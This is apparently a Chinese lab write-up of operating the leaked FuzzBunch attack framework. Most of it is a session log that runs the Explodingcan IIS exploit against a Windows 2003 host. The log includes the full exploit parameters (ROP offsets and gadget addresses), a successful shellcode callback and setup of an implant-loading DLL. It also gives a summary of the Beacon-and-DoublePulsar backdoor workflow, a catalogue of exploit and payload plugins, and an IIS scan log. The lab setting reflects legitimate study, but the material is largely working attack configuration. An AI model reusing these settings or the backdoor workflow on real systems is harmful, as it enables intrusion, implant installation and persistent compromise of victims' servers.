### 优化后的文本

#### 配置选项
- **认证类型 (AuthenticationType)**: 目标服务器的认证方式
  - `0) None`: 无认证
  - `1) Basic`: 基本 HTTP 认证
  - 选择 [0]: 

- **目标操作系统 (Target)**: 
  - `0) W2K3SP0`: Windows 2003 基础版
  - `1) W2K3SP1`: Windows 2003 Service Pack 1
  - `2) W2K3SP2`: Windows 2003 Service Pack 2
  - `3) W2K3SP0_v5IM`: Windows 2003 基础版 (IIS 5.0 隔离模式)
  - `4) W2K3SP1_v5IM`: Windows 2003 Service Pack 1 (IIS 5.0 隔离模式)
  - 选择 [2]: 设置 Target => W2K3SP2

- **监听端口 (ListenPort)**: 目标上 shellcode 监听/接受连接的端口
  - 输入 [3005]: 设置 ListenPort => 3005

- **本地监听端口 (ListenLocalPort)**: 本地监听端口
  - 输入 [3005]: 设置 ListenLocalPort => 3005

- **调用超时时间 (CallinTimeout)**: 在向目标发起连接前的等待时间（秒）
  - 默认值 [10]: 

- **准备执行 Explodingcan**
  - 重定向关闭
  - 配置本地隧道
    - 本地隧道 - local-tunnel-1
      - 目标 IP [172.19.2.18]
      - 目标端口 [80]
      - 本地 (TCP) 172.19.2.18:80
    - 本地隧道 - local-tunnel-2
      - 目标 IP [172.19.2.18]
      - 目标端口 [3005]
      - 本地 (TCP) 172.19.2.18:3005
  - 配置远程隧道
  - 模块: Explodingcan
    - 参数配置
      - ListenPort: 3005
      - ListenLocalPort: 3005
      - CallinTimeout: 10
      - TargetIp: 172.19.2.18
      - TargetPort: 80
      - NetworkTimeout: 60
      - EnableSSL: False
      - IISPathSize: 18
      - hostString: localhost
      - buf1size: 272
      - buf2size: 3072
      - SkipFree: 33686018
      - SkipOffset: 220
      - VirtualProtectOffset: 284
      - WriteAddressOffset1: 224
      - WriteAddressOffset2: 292
      - ObjectAddress: 256
      - ObjectAddressOffset1: 268
      - ObjectAddressOffset4: 252
      - ObjectAddressOffset2: 232
      - ObjectAddressOffset3: 216
      - MovEcxEspOffset: 252
      - StackAdjustOffset1: 220
      - StackAdjustOffset2: 224
      - StackAdjustOffset3: 312
      - Push40Offset: 268
      - LeaveRetOffset1: 308
      - LeaveRetOffset2: 372
      - SetEbp1: 372
      - SetEbp1Offset: 304
      - SetEbp2: 348
      - SetEbp2Offset: 332
      - SetEbp3: 312
      - SetEbp3Offset: 368
      - MovEbpOffset: 336
      - ShellcodeAddr: 416
      - ShellcodeAddrOffset: 280
      - ShellcodeOffset: 376
      - JmpEBXOffset: 276
      - ProcHandleOffset: 288
      - VProtSizeOffset: 296
      - LoadEaxOffset: 312
      - EaxValOffset: 352
      - LoadEax2Offset: 360
      - MovEcxEsp: 1744920706
      - WriteAddress: 1745031872
      - StackAdjust: 1744858703
      - Push40: 1744875795
      - LeaveRet: 1744906727
      - MovEbp: 1744858629
      - JmpEBX: 1744905443
      - SyscallAddress: 2147353344
      - VProtSize: 1745028206
      - LoadEax: 1744868241
      - EaxValAddress: 1744863814
      - LoadEax2: 1744969130
      - PayloadAccessType: Listen
      - AuthenticationType: None
      - Target: W2K3SP2
  - 执行插件？[Yes]:
  - 执行插件
  - 运行漏洞利用
  - 初始化参数
    - Listen: ListenLocalPort: 3005
    - Listen: ListenPort: 3005
    - 初始化完成
  - 初始化网络
    - 创建启动套接字
      - 目标是 172.19.2.18:80
    - 网络初始化完成
  - 构建漏洞利用缓冲区
    - 设置 Egg 认证码: 3a4a4618
    - 设置 Egg XOR 掩码: f4
    - 设置 Egg 中的监听信息，TCP 端口 3005
  - 漏洞利用构建完成
  - 利用目标
    - 构建 HTTP 请求
    - 无认证
    - 发送漏洞利用
    - 发送 5142 (0x00001416) 字节
    - 发送漏洞利用完成
  - 向目标上的监听器发起连接
  - 等待 10 秒后发起连接
  - 连接到监听器
    - 调用成功
  - 等待来自漏洞利用的认证码
    - 认证码检查通过: EGG 3a4a4618 : 生成 3a4a4618
  - 漏洞利用完成
  - Explodingcan 成功
  - 连接到目标已建立
  - 等待下一阶段
  - netstat -ant | findstr 3005
    - TCP 172.19.2.1:3915 172.19.2.18:3005 ESTABLISHED InHost
  - 使用 Pcdlllauncher
  - 进入插件上下文 :: Pcdlllauncher
  - 应用全局变量
    - 设置 NetworkTimeout => 60
  - 应用会话参数
  - 进入提示模式 :: Pcdlllauncher
  - 模块: Pcdlllauncher
    - 参数配置
      - ConnectedTcp: 3005
      - XorMask: 47
      - NetworkTimeout: 60
      - LPFilename: D:\work\malware\bvp47\fuzzbunch\Resources\Pc\Legacy\PC_Exploit.dll
      - LPEntryName: ServiceEntry
      - ImplantFilename: D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll
      - TargetOsArchitecture: x86
      - PCBehavior: 8
  - 插件变量有效
  - 提示设置变量？[Yes]:
  - ConnectedTcp: 已连接的 TCP 套接字
    - 输入 [3005]:
  - XorMask: 通信的 XOR 掩码
    - 输入 [47]:
  - NetworkTimeout: 网络超时时间（秒）。使用 -1 表示无超时。
    - 输入 [60]:
  - LPFilename: 全路径到 LP
    - 输入 [D:\work\malware\bvp47\fuzzbunch\Resources\Pc\Legacy... (plus 16 characters)]:
  - LPEntryName: LP 入口函数名
    - 输入 [ServiceEntry]:
  - ImplantFilename: 全路径到植入负载
    - 输入 [D:\Logs\fb\z0.0.0.1\Payloads\PC_Level3.dll]:
  - TargetOsArchitecture: 目标操作系统的架构
    - `0) x86`: 32 位 Intel x86 处理器
    - `1) x64`: 64 位 AMD x86_64 处理器
    - 选择 [0]:
  - PCBehavior: PEDDLECHEAP EGG 行为
    - `0) 7`: 重用套接字 (PC EGG 行为未完成)
    - `1) 8`: 重用套接字和 PC EGG 行为
    - 选择 [0]: 设置 PCBehavior => 7
  - 因为第二步失败，所以第三步也失败。后面通过 DoublePlusar 上传 Beacon 成功。
  - FB 的基本操作流程是先生成一个 Beacon，然后通过漏洞建立一个通道，最后上传 Beacon 并执行建立后门。

#### 查看系统插件列表
- **插件类别: Exploit**
  - Easybee: 1.0.1 Mdaemon 漏洞
  - Easypi: 3.1.0 IBM Lotus 漏洞
  - Eclipsedwing: 1.5.2 MS08-067
  - Educatedscholar: 1.0.0 MS09-050
  - Emeraldthread: 3.0.0 MS10-061
  - Emphasismine: 3.4.0 IBM Lotus 漏洞
  - Englishmansdentist: 1.2.0 Outlook Exchange 漏洞
  - Erraticgopher: 1.0.1 SMB 漏洞
  - Eskimoroll: 1.1.1 MS14-068
  - Esteemaudit: 2.1.0 RDP 漏洞
  - Eternalromance: 1.4.0 SMBv1 漏洞
  - Eternalsynergy: 1.0.1 SMB 漏洞
  - Ewokfrenzy: 2.0.0 IBM Lotus 漏洞
  - Explodingcan: 2.0.2 IIS 漏洞
  - Zippybeer: 1.0.2 AD 漏洞

- **插件类别: ImplantConfig**
  - Darkpulsar: 1.1.0 后门植入工具
  - Mofconfig: 1.0.0 配置文件投递

- **插件类别: ListeningPost**
  - 无插件

- **插件类别: Payload**
  - Doublepulsar: 1.3.1 后门投递工具
  - Jobadd: 1.1.1 Windows 计划任务添加
  - Jobdelete: 1.1.1 Windows 计划任务删除
  - Joblist: 1.1.1 Windows 计划任务列表
  - Pcdlllauncher: 2.3.1 DllLoader
  - Processlist: 1.1.1 进程列表
  - Regdelete: 1.1.1 Windows 注册表删除
  - Regenum: 1.1.1 Windows 注册表枚举
  - Regread: 1.1.1 Windows 注册表读取
  - Regwrite: 1.1.1 Windows 注册表写入
  - Rpcproxy: 1.0.1 远程调用代理
  - Smbdelete: 1.1.1 删除共享文件
  - Smblist: 1.1.1 显示共享文件
  - Smbread: 1.1.1 读取共享文件
  - Smbwrite: 1.1.1 写入共享文件

- **插件类别: Special**
  - Eternalblue: 2.2.0 永恒之蓝
  - Eternalchampion: 2.0.0 SMB 漏洞利用工具集

- **插件类别: Touch**
  - Architouch: 1.0.0 目标扫描
  - Domaintouch: 1.1.1 AD 扫描
  - Eclipsedwingtouch: 1.0.4 Eclipsedwing 扫描
  - Educatedscholartouch: 1.0.0 Educatedscholar 扫描
  - Emeraldthreadtouch: 1.0.0 Emeraldthread 扫描
  - Erraticgophertouch: 1.0.1 Erraticgopher 扫描
  - Esteemaudittouch: 2.1.0 Esteemaudit 扫描
  - Explodingcantouch: 1.2.1 Explodingcan 扫描
  - Iistouch: 1.2.2 IIS 漏洞扫描
  - Namedpipetouch: 2.0.0 命名管道扫描
  - Printjobdelete: 1.0.0 打印任务删除
  - Printjoblist: 1.0.0 打印任务显示
  - Rpctouch: 2.1.0 RPC 扫描
  - Smbtouch: 1.1.1 SMB 漏洞扫描
  - Webadmintouch: 1.0.1 Webadmin 扫描
  - Worldclienttouch: 1.0.1 Worldclient 扫描

- **使用 Iistouch**
  - 进入插件上下文 :: Iistouch
  - 应用全局变量
    - 设置 TargetIp => 172.19.2.16
    - 设置 NetworkTimeout => 60
  - 准备执行 Iistouch
  - 重定向关闭
  - 配置本地隧道
    - 本地隧道 - local-tunnel-1
      - 目标 IP [172.19.2.16]
      - 目标端口 [80]
      - 本地 (TCP) 172.19.2.16:80
  - 配置远程隧道
  - 模块: Iistouch
    - 参数配置
      - TargetIp: 172.19.2.16
      - TargetPort: 80
      - NetworkTimeout: 60
      - EnableSSL: False
      - hostString: localhost
  - 执行插件？[Yes]:
  - 执行插件
  - 初始化参数
  - 收集参数
    - 发送 HTTP OPTIONS 请求
    - 初始化网络
    - 创建启动套接字
      - 目标是 172.19.2.16:80
    - 发送 HTTP HEAD 请求
    - 初始化网络
    - 创建启动套接字
      - 目标是 172.19.2.16:80
  - 查找 IIS 版本
    - 检查服务器响应中的 IIS 版本
    - 找到 IIS 版本 5.1
    - Windows XP
  - 检测 WEBDAV
    - 检查服务器响应中的 Webdav
    - 找到 SEARCH 选项。Webdav 已启用。
    - 找到 PROPFIND 选项。Webdav 已启用。
  - 查找语言
    - 初始化网络
    - 创建启动套接字
      - 目标是 172.19.2.16:80
    - 字符集匹配: gb2312